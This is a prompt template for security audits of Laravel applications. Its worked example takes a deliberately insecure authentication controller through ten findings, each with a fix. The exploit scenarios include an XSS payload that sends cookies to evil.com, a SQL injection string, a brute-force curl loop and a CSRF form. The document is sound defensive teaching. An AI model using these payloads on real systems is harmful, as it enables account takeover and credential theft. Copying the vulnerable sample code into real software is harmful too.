# Prompt: Security Audit

## Purpose
Perform comprehensive security analysis of Laravel applications to identify vulnerabilities, security misconfigurations, and potential attack vectors.

## When to Use
- Before deploying to production
- After major feature implementation
- Regular security reviews
- After security incidents
- Code review process

---

## Prompt Template

```
Please perform a security audit on:

**Component**: [Code/Feature/Application]
**Scope**: [Authentication/Authorization/Data/etc.]
**Code**:
[CODE_BLOCK]

Please check for:
1. **OWASP Top 10 vulnerabilities**
2. **Authentication/Authorization issues**
3. **Input validation problems**
4. **SQL injection risks**
5. **XSS vulnerabilities**
6. **CSRF protection**
7. **Sensitive data exposure**
8. **Security misconfigurations**
9. **Insecure dependencies**
10. **Logging and monitoring gaps**

Provide:
- **Risk level** for each issue (Critical/High/Medium/Low)
- **Exploit scenario** explaining how it can be attacked
- **Fix recommendation** with code examples
```

---

## Example: User Registration System Audit

### Input:
```
Please perform a security audit on:

**Component**: User registration and login system
**Scope**: Full authentication flow

**Code**:
// Controller
class AuthController extends Controller
{
    public function register(Request $request)
    {
        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'role' => $request->role,
        ]);

        return response()->json($user);
    }

    public function login(Request $request)
    {
        $user = User::where('email', $request->email)->first();

        if ($user && Hash::check($request->password, $user->password)) {
            $token = $user->createToken('auth')->plainTextToken;
            return response()->json(['token' => $token]);
        }

        return response()->json(['error' => 'Invalid credentials'], 401);
    }

    public function updateProfile(Request $request)
    {
        $user = User::find($request->user_id);
        $user->update($request->all());
        return response()->json($user);
    }
}

// Model
class User extends Model
{
    protected $fillable = ['name', 'email', 'password', 'role'];
}
```

### Expected Output:

## 🔴 Security Audit Report

---

### 1. ❌ CRITICAL: Mass Assignment Vulnerability

**Risk Level**: 🔴 **CRITICAL**

**Location**: `register()` and `updateProfile()` methods

**Issue**:
```php
// ❌ Vulnerable code
$user = User::create([
    'name' => $request->name,
    'email' => $request->email,
    'password' => Hash::make($request->password),
    'role' => $request->role,  // ← Attacker can set admin role!
]);

// ❌ Even more vulnerable
$user->update($request->all());  // ← All input fields are updated!
```

**Exploit Scenario**:
```bash
# Attacker sends malicious request
curl -X POST /api/register \
  -d "name=Hacker" \
  -d "email=hacker@evil.com" \
  -d "password=123456" \
  -d "role=admin"  # ← Attacker becomes admin!
  -d "is_verified=1" # ← Attacker bypasses email verification
```

**Impact**:
- Privilege escalation (regular user → admin)
- Bypass email verification
- Modify protected fields

**Fix**:
```php
// ✅ Secure version
public function register(RegisterRequest $request)
{
    $user = User::create([
        'name' => $request->validated('name'),
        'email' => $request->validated('email'),
        'password' => Hash::make($request->validated('password')),
        'role' => 'user', // ← Always set to default
    ]);

    return response()->json(new UserResource($user), 201);
}

public function updateProfile(UpdateProfileRequest $request)
{
    $user = $request->user(); // ← Current authenticated user

    $user->update($request->only(['name', 'bio'])); // ← Only allowed fields

    return response()->json(new UserResource($user));
}

// Model - explicit fillable fields
class User extends Model
{
    protected $fillable = ['name', 'email', 'password'];

    protected $guarded = ['role', 'is_verified', 'email_verified_at'];
}
```

---

### 2. ❌ CRITICAL: No Input Validation

**Risk Level**: 🔴 **CRITICAL**

**Issue**: No validation on any inputs

**Exploit Scenarios**:

1. **SQL Injection** (if raw queries used):
```bash
# Malicious email input
email=admin@example.com' OR '1'='1
```

2. **XSS Attack**:
```bash
name=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
```

3. **Invalid data**:
```bash
email=not-an-email
password=  # Empty password
name=x  # Too short
```

**Fix**:
```php
// ✅ Create Form Request
class RegisterRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        return [
            'name' => ['required', 'string', 'max:255', 'regex:/^[a-zA-Z\s]+$/'],
            'email' => ['required', 'email', 'max:255', 'unique:users'],
            'password' => [
                'required',
                'string',
                'min:8',
                'confirmed',
                Password::min(8)
                    ->mixedCase()
                    ->numbers()
                    ->symbols()
                    ->uncompromised()
            ],
        ];
    }

    protected function prepareForValidation()
    {
        $this->merge([
            'email' => strtolower(trim($this->email)),
            'name' => strip_tags($this->name),
        ]);
    }
}
```

---

### 3. ❌ HIGH: Insecure Direct Object Reference (IDOR)

**Risk Level**: 🟠 **HIGH**

**Location**: `updateProfile()` method

**Issue**:
```php
// ❌ Vulnerable code
public function updateProfile(Request $request)
{
    $user = User::find($request->user_id);  // ← User controls which ID to update!
    $user->update($request->all());
}
```

**Exploit Scenario**:
```bash
# Attacker is user_id=5, but changes user_id=1 (admin)
curl -X PUT /api/profile \
  -H "Authorization: Bearer {token}" \
  -d "user_id=1" \  # ← Attacking admin's profile
  -d "name=Hacked"
```

**Impact**:
- Attacker can modify ANY user's profile
- Data breach
- Account takeover

**Fix**:
```php
// ✅ Secure version - always use authenticated user
public function updateProfile(UpdateProfileRequest $request)
{
    $user = $request->user(); // ← Only current user

    $user->update($request->validated());

    return response()->json(new UserResource($user));
}

// Or use Route Model Binding with authorization
Route::put('/users/{user}', [UserController::class, 'update'])
    ->middleware('can:update,user');
```

---

### 4. ❌ HIGH: No Rate Limiting

**Risk Level**: 🟠 **HIGH**

**Issue**: No rate limiting on authentication endpoints

**Exploit Scenario**:
```bash
# Brute force attack - try 1 million passwords
for i in {1..1000000}; do
    curl -X POST /api/login \
      -d "email=victim@example.com" \
      -d "password=password$i"
done
```

**Impact**:
- Brute force attacks
- Account takeover
- DDoS attacks
- Resource exhaustion

**Fix**:
```php
// ✅ routes/api.php
Route::post('/register', [AuthController::class, 'register'])
    ->middleware('throttle:5,60'); // 5 attempts per hour

Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:login'); // Custom rate limiter

// app/Providers/RouteServiceProvider.php
protected function configureRateLimiting()
{
    RateLimiter::for('login', function (Request $request) {
        return Limit::perMinute(5)
            ->by($request->email . '|' . $request->ip())
            ->response(function () {
                return response()->json([
                    'message' => 'Too many login attempts. Please try again in 1 minute.'
                ], 429);
            });
    });
}
```

---

### 5. ❌ HIGH: Sensitive Data Exposure

**Risk Level**: 🟠 **HIGH**

**Issue**: Returning entire user object with password hash

**Vulnerable Code**:
```php
// ❌ Password hash exposed
return response()->json($user);
```

**Response exposes**:
```json
{
    "id": 1,
    "email": "user@example.com",
    "password": "$2y$10$abcdef...",  // ← Password hash exposed!
    "remember_token": "xyz123",      // ← Token exposed!
    "api_token": "secret_token"      // ← API token exposed!
}
```

**Impact**:
- Password hashes can be cracked offline
- Tokens can be stolen
- Privacy violation

**Fix**:
```php
// ✅ Use API Resources
class UserResource extends JsonResource
{
    public function toArray($request)
    {
        return [
            'id' => $this->id,
            'name' => $this->name,
            'email' => $this->email,
            'created_at' => $this->created_at->toIso8601String(),
            // Password, tokens, etc. are NOT included
        ];
    }
}

// Controller
return response()->json(new UserResource($user));

// Model - hide sensitive attributes
class User extends Model
{
    protected $hidden = [
        'password',
        'remember_token',
        'two_factor_secret',
        'two_factor_recovery_codes',
    ];
}
```

---

### 6. ❌ MEDIUM: Missing CSRF Protection

**Risk Level**: 🟡 **MEDIUM**

**Issue**: API endpoints without CSRF tokens

**Exploit Scenario**:
```html
<!-- Evil website tricks logged-in user -->
<form action="https://yourapp.com/api/profile" method="POST">
    <input name="email" value="hacker@evil.com">
    <input type="submit" value="Click for free prize!">
</form>
```

**Fix**:
```php
// ✅ For web routes
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    // Only except webhook endpoints
    'webhooks/*',
];

// ✅ For API routes - use Sanctum with proper CORS
// config/cors.php
'supports_credentials' => true,

// sanctum.php
'stateful' => explode(',', env('SANCTUM_STATEFUL_DOMAINS', 'localhost,localhost:3000')),
```

---

### 7. ❌ MEDIUM: No Account Lockout

**Risk Level**: 🟡 **MEDIUM**

**Issue**: No account lockout after failed attempts

**Fix**:
```php
// ✅ Implement account lockout
use Illuminate\Support\Facades\RateLimiter;

public function login(LoginRequest $request)
{
    $key = 'login:' . $request->email;

    if (RateLimiter::tooManyAttempts($key, 5)) {
        $seconds = RateLimiter::availableIn($key);

        return response()->json([
            'message' => "Account locked. Try again in {$seconds} seconds."
        ], 429);
    }

    $credentials = $request->validated();

    if (Auth::attempt($credentials)) {
        RateLimiter::clear($key); // Clear on success

        $user = Auth::user();
        $token = $user->createToken('auth')->plainTextToken;

        return response()->json(['token' => $token]);
    }

    RateLimiter::hit($key, 300); // Lock for 5 minutes

    return response()->json(['message' => 'Invalid credentials'], 401);
}
```

---

### 8. ❌ MEDIUM: Weak Password Policy

**Risk Level**: 🟡 **MEDIUM**

**Issue**: No password strength requirements

**Fix**:
```php
// ✅ Strong password validation
use Illuminate\Validation\Rules\Password;

'password' => [
    'required',
    'confirmed',
    Password::min(12)
        ->letters()
        ->mixedCase()
        ->numbers()
        ->symbols()
        ->uncompromised() // Check against data breaches
],
```

---

### 9. ❌ LOW: Missing Security Headers

**Risk Level**: 🟢 **LOW** (but easy to fix)

**Issue**: No security headers set

**Fix**:
```php
// ✅ Add security headers middleware
// app/Http/Middleware/SecurityHeaders.php
class SecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-XSS-Protection', '1; mode=block');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $response->headers->set('Content-Security-Policy', "default-src 'self'");

        return $response;
    }
}

// Register in Kernel.php
protected $middleware = [
    \App\Http\Middleware\SecurityHeaders::class,
];
```

---

### 10. ❌ LOW: Information Disclosure

**Risk Level**: 🟢 **LOW**

**Issue**: Different error messages for "email not found" vs "wrong password"

**Exploit**: Attacker can enumerate valid emails

**Fix**:
```php
// ✅ Generic error message
if (!Auth::attempt($credentials)) {
    return response()->json([
        'message' => 'The provided credentials are incorrect.'  // ← Generic
    ], 401);
}
```

---

## 📊 Summary Report

### Critical Issues (Fix Immediately)
1. ❌ Mass assignment vulnerability
2. ❌ No input validation
3. ❌ Insecure direct object reference

### High Priority (Fix This Week)
4. ❌ No rate limiting
5. ❌ Sensitive data exposure

### Medium Priority (Fix This Month)
6. ❌ Missing CSRF protection
7. ❌ No account lockout
8. ❌ Weak password policy

### Low Priority (Nice to Have)
9. ❌ Missing security headers
10. ❌ Information disclosure

---

## ✅ Complete Secure Implementation

```php
<?php

namespace App\Http\Controllers\Api;

use App\Http\Requests\RegisterRequest;
use App\Http\Requests\LoginRequest;
use App\Http\Resources\UserResource;
use App\Models\User;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;

class AuthController extends Controller
{
    /**
     * Register a new user.
     */
    public function register(RegisterRequest $request): JsonResponse
    {
        $user = User::create([
            'name' => $request->validated('name'),
            'email' => $request->validated('email'),
            'password' => Hash::make($request->validated('password')),
            'role' => 'user', // Default role
        ]);

        // Send email verification
        $user->sendEmailVerificationNotification();

        $token = $user->createToken('auth')->plainTextToken;

        return response()->json([
            'data' => new UserResource($user),
            'token' => $token,
            'message' => 'Registration successful. Please verify your email.',
        ], 201);
    }

    /**
     * Authenticate user.
     */
    public function login(LoginRequest $request): JsonResponse
    {
        $key = 'login:' . $request->validated('email');

        // Check rate limit
        if (RateLimiter::tooManyAttempts($key, 5)) {
            $seconds = RateLimiter::availableIn($key);

            return response()->json([
                'message' => "Too many attempts. Please try again in {$seconds} seconds."
            ], 429);
        }

        $credentials = $request->only('email', 'password');

        if (Auth::attempt($credentials)) {
            RateLimiter::clear($key);

            $user = Auth::user();
            $token = $user->createToken('auth', ['*'], now()->addDays(30))
                ->plainTextToken;

            return response()->json([
                'data' => new UserResource($user),
                'token' => $token,
            ]);
        }

        RateLimiter::hit($key, 300); // 5 minutes

        return response()->json([
            'message' => 'The provided credentials are incorrect.'
        ], 401);
    }

    /**
     * Logout user.
     */
    public function logout(): JsonResponse
    {
        Auth::user()->currentAccessToken()->delete();

        return response()->json([
            'message' => 'Logged out successfully'
        ]);
    }
}
```

---

## 🛡️ Security Checklist

### Before Deployment
- [ ] All inputs validated
- [ ] SQL injection prevented (use Eloquent/Query Builder)
- [ ] XSS prevented (escape output, use `{{ }}` not `{!! !!}`)
- [ ] CSRF protection enabled
- [ ] Mass assignment protected
- [ ] Authorization checks on all endpoints
- [ ] Rate limiting configured
- [ ] Security headers set
- [ ] HTTPS enforced
- [ ] Sensitive data not exposed in responses
- [ ] Strong password policy enforced
- [ ] Account lockout implemented
- [ ] Email verification required
- [ ] Logging and monitoring configured
- [ ] Dependencies updated
- [ ] Error messages don't leak information
- [ ] File upload validation
- [ ] API tokens properly secured

---

## Related Prompts

- `code-review.md` - Review code for security
- `testing-strategy.md` - Security testing
- `refactoring-suggestions.md` - Refactor insecure code
